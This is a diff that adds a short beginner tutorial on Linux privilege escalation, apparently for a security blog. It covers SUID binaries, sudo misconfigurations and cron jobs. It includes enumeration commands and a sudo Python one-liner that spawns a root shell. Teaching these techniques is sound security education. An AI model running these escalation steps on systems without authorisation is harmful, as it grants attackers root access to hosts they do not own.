@@ -1,0 +1,59 @@
+---
+title: "Linux Privilege Escalation Basics"
+slug: "linux-privilege-escalation-basics"
+date: 2025-01-20
+lang: "en"
+type: "tutorial"
+category: "Privesc"
+difficulty: "Débutant"
+tags: ["linux", "privesc", "suid", "sudo"]
+excerpt: "A beginner-friendly guide to common Linux privilege escalation techniques including SUID binaries, sudo misconfigurations, and cron jobs."
+published: true
+---
+
+## Introduction
+
+Privilege escalation is the process of exploiting a vulnerability to gain elevated access to resources that are normally protected. This guide covers the most common techniques on Linux systems.
+
+## SUID Binaries
+
+SUID (Set User ID) binaries run with the permissions of the file owner rather than the user executing them.
+
+```bash title="Finding SUID binaries"
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Check each binary against [GTFOBins](https://gtfobins.github.io/) to see if it can be exploited.
+
+## Sudo Misconfigurations
+
+Always check what commands the current user can run with sudo.
+
+```bash
+sudo -l
+```
+
+```text {3}
+User www-data may run the following commands on target:
+    (ALL) NOPASSWD: /usr/bin/vim
+    (ALL) NOPASSWD: /usr/bin/python3
+```
+
+If Python is available with NOPASSWD:
+
+```python title="spawn shell via sudo python"
+sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
+```
+
+## Cron Jobs
+
+Check for writable cron jobs that run as root.
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.d/
+```
+
+## Conclusion
+
+Always enumerate systematically. Use tools like LinPEAS to automate the process, but understand what each check does manually first.
